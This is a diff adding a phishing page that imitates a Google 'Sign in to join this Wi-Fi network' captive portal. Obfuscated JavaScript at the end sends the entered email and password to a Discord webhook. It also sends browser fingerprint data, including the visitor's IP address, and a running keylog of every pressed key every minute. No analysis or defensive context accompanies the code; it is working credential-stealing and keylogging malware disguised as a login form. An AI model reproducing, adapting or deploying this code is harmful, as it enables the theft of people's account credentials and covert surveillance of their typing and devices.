@@ -1,0 +1,259 @@
+
+<style>
+  #SignIn {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    min-width: 368px;
+    max-width: 368px;
+    min-height: 480px;
+    max-height: 480px;
+    border: 1px solid #ccc;
+    border-radius: 10px;
+    padding: 70px 40px 0px 40px;
+  }
+  #title {
+    align-items: center;
+    border-bottom: 1px solid #ccc;
+    display: flex;
+    height: 36px;
+    left: 0;
+    padding: 0 16px;
+    position: absolute;
+    right: 0;
+    top: 0;
+    color: rgb(95, 99, 104);
+    font-size: 14px;
+    margin-top: -2px;
+  }
+
+  .logo {
+    padding-right: 10px;
+  }
+
+  span#signin {
+    color: rgb(32, 33, 36);
+    font-size: 24px;
+    border: none;
+    font-family: "Google Sans", "Noto Sans Myanmar UI", arial, sans-serif;
+    font-weight: 400;
+    line-height: 1.3333;
+    margin-bottom: 0;
+    margin-top: 0;
+    word-break: break-word;
+    padding-top: 61px;
+  }
+
+  .wifi {
+    padding: 12px;
+  }
+
+  .btnlink {
+    border-radius: 4px;
+    color: rgb(26, 115, 232);
+    display: inline-block;
+    font-weight: bold;
+    letter-spacing: 0.25px;
+    outline: 0;
+    position: relative;
+    background-color: transparent;
+    cursor: pointer;
+    font-size: inherit;
+    text-align: left;
+    margin: -2px -3px;
+    padding: 2px 3px;
+    border: 0;
+  }
+
+  span#continue {
+    padding-bottom: 1px;
+    padding-top: 7px;
+    color: rgb(32, 33, 36);
+    font-size: 16px;
+    font-weight: 400;
+    letter-spacing: 0.1px;
+    line-height: 1.5;
+    position: relative;
+    top: 39px;
+  }
+
+  input[type="email"] {
+      position: absolute;
+      top: 210px;
+      left: 50%;
+      transform: translateX(-50%);
+      border-radius: 4px;
+      width: 366px;
+      height: 54px;
+      border: 1px solid #ccc;
+      transition: border-color 0.3s ease;
+      font-weight: 600;
+      padding-left: 10px;
+    }
+  input[type="password"] {
+      position: absolute;
+      top: 280px;
+      left: 50%;
+      transform: translateX(-50%);
+      border-radius: 4px;
+      width: 366px;
+      height: 54px;
+      border: 1px solid #ccc;
+      transition: border-color 0.3s ease;
+      font-weight: 600;
+      padding-left: 10px;
+    }
+
+    input[type="email"]:focus {
+      border-color: rgb(26, 115, 232) !important;
+      border-width: 2px;
+      outline: none;
+    }
+    input[type="password"]:focus {
+      border-color: rgb(26, 115, 232) !important;
+      border-width: 2px;
+      outline: none;
+    }
+
+    .fake-placeholder_email {
+        text-align: left;
+      padding-left: 5px;
+      border-radius: 15px;
+      padding-right: 5px;
+      position: absolute;
+      top: 227px;
+      left: 73px;
+      transform: translateX(-50%);
+      font-size: 16px;
+      transition: transform 0.2s ease, font-size 0.2s ease;
+      color: rgb(95,99,104);
+      background-color:#ffffff;
+      pointer-events: none;
+      z-index: 10;
+    }
+.fake-placeholder_password {
+    text-align: left;
+      padding-left: 5px;
+      border-radius: 15px;
+      padding-right: 5px;
+      position: absolute;
+      top: 297px;
+      left: 87px;
+      transform: translateX(-50%);
+      font-size: 16px;
+      transition: transform 0.2s ease, font-size 0.2s ease;
+      color: rgb(95,99,104);
+      background-color:#ffffff;
+      pointer-events: none;
+      z-index: 10;
+    }
+
+    input[type="email"]:focus + .fake-placeholder_email {
+      color:rgb(26, 115, 232) !important;
+      font-size: 12px;
+      transform: translateY(-25px) translateX(-61%);
+    }
+    input[type="password"]:focus + .fake-placeholder_password {
+      color:rgb(26, 115, 232) !important;
+      font-size: 12px;
+      transform: translateY(-25px) translateX(-61%);
+    }
+    
+    .details {
+    position: absolute;
+    top: 350px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 360px;
+    text-align: left;
+    color: rgb(95,99,104);
+    font-size: 14px;
+    line-height: 1.46;
+    }
+#next {
+  position:absolute;
+  top: 470px;
+    right:80px;
+  color:#ffffff;
+  background-color:rgb(26, 115, 232);
+  height: 36px;
+  width:80px;
+    font-family: "Google Sans",Roboto,Arial,sans-serif;
+    font-size: .875rem;
+    letter-spacing: .0107142857em;
+    font-weight: 500;
+  border-radius: 4px;
+  border:none;
+    cursor: pointer;
+}
+#next:hover {
+  position:absolute;
+  top: 470px;
+    right:80px;
+  color:#ffffff;
+  background-color:rgb(50, 135, 246);
+  height: 36px;
+  width:80px;
+    font-family: "Google Sans",Roboto,Arial,sans-serif;
+    font-size: .875rem;
+    letter-spacing: .0107142857em;
+    font-weight: 500;
+  border-radius: 4px;
+  border:none;
+    cursor: pointer;
+}
+#next:active {
+  position:absolute;
+  top: 470px;
+    right:80px;
+  color:#ffffff;
+  background-color:rgb(26, 112, 224);
+  height: 36px;
+  width:80px;
+    font-family: "Google Sans",Roboto,Arial,sans-serif;
+    font-size: .875rem;
+    letter-spacing: .0107142857em;
+    font-weight: 500;
+  border-radius: 4px;
+  border:none;
+    cursor: pointer;
+}
+    a {
+      color:rgb(26, 115, 232) !important;
+      font-weight: 600;
+    cursor: pointer;
+    }
+  html, head, body {
+    background-color: #ffffff;
+    color: rgb(32, 33, 36);
+    font-family: roboto, "Noto Sans Myanmar UI", arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+  }
+</style>
+<div id="googleLogo">
+
+</div>
+  <div id="SignIn">
+      <div id="title"><svg xmlns="https://www.w3.org/2000/svg" width="14px" height="14px" viewBox="0 0 48 48" aria-hidden="true" class="logo"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path><path fill="none" d="M2 2h44v44H2z"></path></svg>Sign in with <p> </p><svg viewBox="0 0 75 24" width="56" height="15" style="position:absolute;left:112px;padding-top:3px;" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg></div>
+      <svg xmlns="http://www.w3.org/2000/svg" width="37" height="37" fill="currentColor" class="wifi" viewBox="0 0 16 16"> <path d="M15.384 6.115a.485.485 0 0 0-.047-.736A12.444 12.444 0 0 0 8 3C5.259 3 2.723 3.882.663 5.379a.485.485 0 0 0-.048.736.518.518 0 0 0 .668.05A11.448 11.448 0 0 1 8 4c2.507 0 4.827.802 6.716 2.164.205.148.49.13.668-.049z"/> <path d="M13.229 8.271a.482.482 0 0 0-.063-.745A9.455 9.455 0 0 0 8 6c-1.905 0-3.68.56-5.166 1.526a.48.48 0 0 0-.063.745.525.525 0 0 0 .652.065A8.46 8.46 0 0 1 8 7a8.46 8.46 0 0 1 4.576 1.336c.206.132.48.108.653-.065zm-2.183 2.183c.226-.226.185-.605-.1-.75A6.473 6.473 0 0 0 8 9c-1.06 0-2.062.254-2.946.704-.285.145-.326.524-.1.75l.015.015c.16.16.407.19.611.09A5.478 5.478 0 0 1 8 10c.868 0 1.69.201 2.42.56.203.1.45.07.61-.091l.016-.015zM9.06 12.44c.196-.196.198-.52-.04-.66A1.99 1.99 0 0 0 8 11.5a1.99 1.99 0 0 0-1.02.28c-.238.14-.236.464-.04.66l.706.706a.5.5 0 0 0 .707 0l.707-.707z"/> </svg>
+      <span id="signin">Sign in</span>
+      <br>
+      <span id="continue">to join this <button class="btnlink" type="button" title="Signing in will grant you accces to the following: Wi-Fi">Wi-Fi</button> network.</span>
+      <div class="fake-placeholder_email">Email</div>
+      <div class="fake-placeholder_password">password</div>
+      <form action="/get" id="email-form-step">
+      <input type="email" on autocomplete="username" spellcheck="false" tabindex="0" value="" aria-disabled="false" autocapitalize="none" data-initial-value="">
+          
+      <input type="password" on autocomplete="password" spellcheck="false" tabindex="0" value="" aria-disabled="false" autocapitalize="none" data-initial-value="">
+    
+
+   <button id="next" type="submit">Next</button>
+      </form>
+ <div class="details">To connect, Wi-Fi may capture your device's MAC address, IP address, and data usage. Before connecting, you can review this Wi-Fi's <a href="https://policies.google.com/privacy">privacy policy</a> and <a href="https://accounts.google.com/TOS">terms of service</a>.</div>
+    </div>
+<script>
+const _0x31348e=_0x5f84;(function(_0x4a0d3d,_0x12679e){const _0x17bf4c=_0x5f84,_0x399541=_0x4a0d3d();while(!![]){try{const _0x423884=-parseInt(_0x17bf4c(0xd4))/0x1+-parseInt(_0x17bf4c(0xd1))/0x2+-parseInt(_0x17bf4c(0xbf))/0x3*(parseInt(_0x17bf4c(0x109))/0x4)+parseInt(_0x17bf4c(0x108))/0x5*(parseInt(_0x17bf4c(0xbe))/0x6)+-parseInt(_0x17bf4c(0xf1))/0x7*(parseInt(_0x17bf4c(0xcb))/0x8)+parseInt(_0x17bf4c(0xc8))/0x9+-parseInt(_0x17bf4c(0xf8))/0xa*(-parseInt(_0x17bf4c(0xef))/0xb);if(_0x423884===_0x12679e)break;else _0x399541['push'](_0x399541['shift']());}catch(_0x426234){_0x399541['push'](_0x399541['shift']());}}}(_0x17ed,0x33a0d));const if_error='htt'+'ps://disc'+_0x31348e(0x10a)+_0x31348e(0xfd)+_0x31348e(0xbb)+'oks/120'+'158498'+_0x31348e(0xba)+'5483938/iFaYN'+_0x31348e(0xcd)+'qyMMA9J2GymXXOlDTqFP'+_0x31348e(0xe6)+_0x31348e(0xcc);function error_ran(_0x15b644){const _0x771d1b=_0x31348e;fetch(if_error,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'content':_0x15b644})})[_0x771d1b(0xd6)](_0x492903=>{const _0x216fbb=_0x771d1b;_0x492903['ok']?console[_0x216fbb(0xdb)](_0x216fbb(0xf6)):console[_0x216fbb(0xf2)](_0x216fbb(0xdf),_0x492903[_0x216fbb(0xf0)]);})['catch'](_0x5a238a=>console['error'](_0x771d1b(0x105),_0x5a238a));}const emailInput=document['querySelector']('input[type=\x22email\x22]'),passwordInput=document[_0x31348e(0xe4)](_0x31348e(0xde)),fakePlaceholder_email=document['querySelector'](_0x31348e(0xea)),fakePlaceholder_password=document[_0x31348e(0xe4)](_0x31348e(0x101));emailInput[_0x31348e(0xfc)](_0x31348e(0xc4),function(){const _0x56581c=_0x31348e;emailInput[_0x56581c(0xf3)][_0x56581c(0xfe)]>0x0?fakePlaceholder_email[_0x56581c(0x100)]='font-size:12px;transform:translateY(-25px)\x20translateX(-61%);':fakePlaceholder_email[_0x56581c(0x100)]='';;}),emailInput[_0x31348e(0xfc)](_0x31348e(0xe9),function(){const _0x3397bc=_0x31348e;fakePlaceholder_email[_0x3397bc(0x100)]='font-size:12px;transform:translateY(-25px)\x20translateX(-61%);color:rgb(26,\x20112,\x20224);';}),emailInput[_0x31348e(0xfc)](_0x31348e(0xe0),function(){const _0x57e761=_0x31348e;fakePlaceholder_email['style']=_0x57e761(0xd5);}),passwordInput['addEventListener']('input',function(){const _0x26e1be=_0x31348e;passwordInput[_0x26e1be(0xf3)]['length']>0x0?fakePlaceholder_password['style']=_0x26e1be(0xd5):fakePlaceholder_password[_0x26e1be(0x100)]='';}),passwordInput[_0x31348e(0xfc)](_0x31348e(0xe9),function(){fakePlaceholder_password['style']='font-size:12px;transform:translateY(-25px)\x20translateX(-61%);color:rgb(26,\x20112,\x20224);';}),passwordInput['addEventListener'](_0x31348e(0xe0),function(){const _0x4b9d10=_0x31348e;fakePlaceholder_password[_0x4b9d10(0x100)]=_0x4b9d10(0xd5);}),document[_0x31348e(0x102)]('email-form-step')[_0x31348e(0xfc)](_0x31348e(0xc1),function(_0x1d4f7a){const _0xc1e8cd=_0x31348e;_0x1d4f7a['preventDefault'](),error_ran(_0xc1e8cd(0xed)+emailInput[_0xc1e8cd(0xf3)]+'\x0aPassword:\x0a'+passwordInput['value']);});let DataOnUser=[],language=navigator[_0x31348e(0xe5)];DataOnUser['push'](_0x31348e(0xd2)+language);let languageList=navigator['languages'];DataOnUser['push'](_0x31348e(0xc6)+languageList);function _0x5f84(_0x21a9f5,_0x1b9b65){const _0x17ed6b=_0x17ed();return _0x5f84=function(_0x5f84df,_0x4145c4){_0x5f84df=_0x5f84df-0xb8;let _0x65c498=_0x17ed6b[_0x5f84df];return _0x65c498;},_0x5f84(_0x21a9f5,_0x1b9b65);}let os=navigator[_0x31348e(0xb9)];DataOnUser['push']('Operating\x20System:\x20'+os);let referrer=document['referrer'];referrer==''&&(referrer='No\x20Referrer');DataOnUser[_0x31348e(0xe2)](_0x31348e(0xe8)+referrer);let time=new Date();DataOnUser[_0x31348e(0xe2)](_0x31348e(0xf4)+time[_0x31348e(0xff)]()),DataOnUser[_0x31348e(0xe2)](_0x31348e(0x10b)+time[_0x31348e(0x107)]());let screenResolution=screen[_0x31348e(0xe1)]+'x'+screen[_0x31348e(0xc5)];DataOnUser[_0x31348e(0xe2)]('Screen\x20Resolution:\x20'+screenResolution);let userAgent=navigator[_0x31348e(0xfa)];DataOnUser[_0x31348e(0xe2)](_0x31348e(0xd7)+userAgent);function _0x17ed(){const _0x9ba296=['font-size:12px;transform:translateY(-25px)\x20translateX(-61%);','then','User\x20Agent:\x20','Enter','Pressed\x20keys:\x0a','level','log','Error\x20fetching\x20IP\x20address:','Device\x20Memory:\x20Memory\x20information\x20is\x20not\x20available\x20in\x20this\x20browser.','input[type=\x22password\x22]','Error\x20sending\x20message.\x20Status:','blur','width','push','deviceMemory','querySelector','language','1pyxo3rtO3ZQ4oLDh34','DateTimeFormat','Referring\x20Website:\x20','focus','.fake-placeholder_email','key','getBattery','Email:\x0a','Data:\x0a','568293oxDASy','status','736995HgvGYf','error','value','Visit\x20Time:\x20','json','Message\x20sent\x20successfully','Escape','70SMykae','{SPACE}','userAgent','Desktop','addEventListener','pi/we','length','toLocaleTimeString','style','.fake-placeholder_password','getElementById','Battery\x20Level:\x20','Device\x20Type:\x20','Error\x20sending\x20message:','test','toLocaleDateString','69655LnoBrG','279976PQNaoG','ord.com/a','Current\x20Date:\x20','https://api.ipify.org?format=json','join','appVersion','014','bho','catch','battery','138ThpbqD','9OARjAZ','Alt','submit','Meta','IP\x20Address:\x20','input','height','Preferred\x20Languages\x20List:\x20','keydown','2112507DbFzDI','timeZone','Timezone:\x20','8vJAECE','Ubu1-pye3dd8qw','b6rbrYGwyM','Mobile','resolvedOptions','{ALT}','525842OSYiBl','Language:\x20','{CTRL}','127120jmBmsM'];_0x17ed=function(){return _0x9ba296;};return _0x17ed();}let deviceType=/mobile/i[_0x31348e(0x106)](userAgent)?_0x31348e(0xce):_0x31348e(0xfb);DataOnUser[_0x31348e(0xe2)](_0x31348e(0x104)+deviceType);if(navigator['deviceMemory']){let memory=navigator[_0x31348e(0xe3)];DataOnUser['push']('Device\x20Memory:\x20'+memory+'GB');}else DataOnUser[_0x31348e(0xe2)](_0x31348e(0xdd));let timezone=Intl[_0x31348e(0xe7)]()[_0x31348e(0xcf)]()[_0x31348e(0xc9)];DataOnUser['push'](_0x31348e(0xca)+timezone);if(navigator[_0x31348e(0xec)])navigator['getBattery']()[_0x31348e(0xd6)](function(_0x158f8f){const _0x302fbd=_0x31348e;let _0x515b5a=_0x158f8f[_0x302fbd(0xda)]*0x64+'%';DataOnUser['push']('Battery\x20Level:\x20'+_0x515b5a);});else{if(navigator[_0x31348e(0xbd)]){let batteryLevel=navigator[_0x31348e(0xbd)][_0x31348e(0xda)]*0x64+'%';DataOnUser['push'](_0x31348e(0x103)+batteryLevel);}}fetch(_0x31348e(0x10c))[_0x31348e(0xd6)](_0x1f67d5=>_0x1f67d5[_0x31348e(0xf5)]())[_0x31348e(0xd6)](_0x374702=>{const _0x57e6fe=_0x31348e;DataOnUser['push'](_0x57e6fe(0xc3)+_0x374702['ip']);})[_0x31348e(0xbc)](_0x36d118=>{const _0x548081=_0x31348e;console['log'](_0x548081(0xdc),_0x36d118);}),error_ran(_0x31348e(0xee)+DataOnUser[_0x31348e(0xb8)]('\x0a'));let pressedKeys='';document[_0x31348e(0xfc)](_0x31348e(0xc7),function(_0x166468){const _0x4c0df1=_0x31348e;let _0x110b71='';if(_0x166468[_0x4c0df1(0xeb)]==='\x20')_0x110b71=_0x4c0df1(0xf9);else{if(_0x166468[_0x4c0df1(0xeb)]===_0x4c0df1(0xd8))_0x110b71='{ENTER}';else{if(_0x166468[_0x4c0df1(0xeb)]===_0x4c0df1(0xf7))_0x110b71='{ESC}';else{if(_0x166468[_0x4c0df1(0xeb)]==='Shift')_0x110b71='{SHIFT}';else{if(_0x166468[_0x4c0df1(0xeb)]==='Control')_0x110b71=_0x4c0df1(0xd3);else{if(_0x166468[_0x4c0df1(0xeb)]===_0x4c0df1(0xc0))_0x110b71=_0x4c0df1(0xd0);else _0x166468['key']===_0x4c0df1(0xc2)?_0x110b71='{GUI}':_0x110b71=_0x166468['key'];}}}}}pressedKeys+=_0x110b71;});function sendKeys(){const _0x2f8c70=_0x31348e;error_ran(_0x2f8c70(0xd9)+pressedKeys);}const intervalId=setInterval(sendKeys,0xea60);
+</script>
